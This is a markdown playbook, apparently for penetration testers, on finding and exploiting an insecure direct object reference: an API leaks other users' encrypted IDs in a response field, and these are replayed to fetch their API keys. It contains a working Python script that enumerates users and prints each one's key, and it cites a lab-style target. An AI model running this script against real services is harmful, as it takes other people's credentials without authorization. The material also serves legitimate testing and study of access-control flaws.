# IDOR via Encrypted ID Chaining

## When to Use
- API endpoint returns encrypted/encoded user identifiers in response body
- Endpoints accept both an "auth" parameter (your ID) and a "target" parameter
- Response contains a MESSAGE/meta field that changes based on target parameter

## Pattern: Response-Leaked Encrypted IDs

Some APIs use encrypted user IDs (e.g., double-base64 of AES ciphertext) for authorization.
The IDOR exists when the API response leaks OTHER users' encrypted IDs that can be reused.

### Detection
1. Call the endpoint with your valid enc_id + varying target parameter (e.g., new_user_id=1,2,3...)
2. The RESULT always returns YOUR data (appears secure)
3. But the MESSAGE/meta field returns DIFFERENT encrypted IDs for each target value
4. Those leaked enc_ids belong to other users

### Exploitation
```python
import requests

BASE = "https://target.com"
MY_ENC_ID = "M24rbXlCQ0JMT3plYmpJQ2Noclhqdz09"  # your authenticated enc_id
session = requests.Session()
# ... login first to get session cookie ...

# Step 1: Enumerate other users' enc_ids via the response MESSAGE field
other_enc_ids = {}
for user_id in range(1, 200):
    r = session.post(f"{BASE}/api_key", data={
        "enc_id": MY_ENC_ID,
        "new_user_id": str(user_id)
    })
    data = r.json()
    if data.get("STATUS") == 1:
        other_enc_ids[user_id] = data["MESSAGE"]

# Step 2: Use each leaked enc_id to access that user's data
for user_id, enc_id in other_enc_ids.items():
    r = session.post(f"{BASE}/api_key", data={
        "enc_id": enc_id,
        "new_user_id": str(user_id)
    })
    data = r.json()
    if data.get("STATUS") == 1:
        api_key = data["RESULT"]
        print(f"User {user_id}: API Key = {api_key}")
```

### Key Indicators
- Response has both a RESULT (your data) and MESSAGE (metadata) field
- MESSAGE value changes when you vary a secondary parameter
- MESSAGE values look like encrypted/encoded tokens (base64 of base64, etc.)
- Using those MESSAGE values as the primary auth parameter returns different RESULT data

## Real-World Example

### hackme1.secops.group (June 2026)
- Endpoint: POST /api_key
- Parameters: enc_id (double-base64 AES-encrypted user ID), new_user_id (integer)
- Behavior: always returns YOUR api key in RESULT, but leaks target user's enc_id in MESSAGE
- Exploit: use leaked enc_id as the enc_id parameter → returns target user's API key
- Impact: full API key disclosure for any user (Broken Access Control / IDOR)

## Pitfalls
- The initial test (changing new_user_id while keeping your enc_id) appears secure — RESULT doesn't change
- The IDOR is INDIRECT — you must use the leaked value from MESSAGE in a SECOND request
- Don't give up after the first test shows "always returns my data" — check ALL response fields
- Browser console fetch() is ideal for rapid enumeration when curl sessions don't persist
